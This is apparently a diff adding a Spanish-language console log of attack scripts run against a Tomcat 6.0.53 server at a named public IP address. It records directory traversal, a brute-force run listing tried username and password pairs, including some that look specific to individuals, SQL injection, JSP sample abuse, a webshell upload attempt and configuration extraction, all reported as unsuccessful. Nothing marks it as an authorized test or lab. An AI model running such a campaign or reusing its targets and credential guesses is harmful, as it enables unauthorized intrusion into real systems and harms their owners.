@@ -1,0 +1,47 @@
+Explotación Avanzada de Tomcat 6.0.53:
+
+=== EXPLOTACIÓN COMPLETA TOMCAT 6.0.53 ===
+Objetivo: http://189.254.143.102
+
+[+] Explotando Directory Traversal...
+
+[+] Fuerza bruta avanzada...
+[-] Falló: admin:admin
+[-] Falló: tomcat:tomcat
+[-] Falló: manager:manager
+[-] Falló: admin:tomcat
+[-] Falló: hnieto:utslp
+[-] Falló: hnieto:hnieto
+[-] Falló: admin:utslp
+[-] Falló: sito:sito
+[-] Falló: admin:sito
+[-] Falló: root:root
+[-] Falló: admin:password
+[-] Falló: tomcat:admin
+[-] Falló: both:tomcat
+[-] Falló: role1:role1
+[-] Falló: hnieto:password
+[-] Falló: admin:123456
+
+[+] Explotando SQL Injection...
+
+[+] Explotando JSP Samples...
+
+[+] Intentando upload de webshell...
+
+==================================================
+EXPLOTACIÓN COMPLETADA
+==================================================
+
+Extracción Específica de Configuraciones:
+
+PS C:\Users\MarxB\Desktop\ProyectoSito> py .\EEConfig.py http://189.254.143.102
+[+] Extrayendo configuraciones via /examples/...
+PS C:\Users\MarxB\Desktop\ProyectoSito>
+
+Explotación de Sesión y AJAX:
+
+PS C:\Users\MarxB\Desktop\ProyectoSito> py .\AJAX.py http://189.254.143.102
+[+] Iniciando fuerza bruta avanzada...
+❌ No se encontraron credenciales válidas
+PS C:\Users\MarxB\Desktop\ProyectoSito> 
